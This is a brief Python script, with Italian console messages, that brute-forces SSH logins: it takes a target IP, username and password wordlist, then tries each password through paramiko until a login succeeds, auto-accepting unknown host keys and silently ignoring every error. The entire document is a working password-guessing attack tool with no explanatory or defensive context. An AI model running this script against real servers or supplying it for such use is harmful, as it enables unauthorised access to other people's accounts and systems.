import paramiko

ip = input("IP: ")
user = input("User: ")
wordlist = input("Wordlist: ")

with open(wordlist, "r") as f:
    for pwd in f:
        pwd = pwd.strip()
        print("Provo:", pwd)

        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=user, password=pwd)
            print("Trovata:", pwd)
            break
        except:
            pass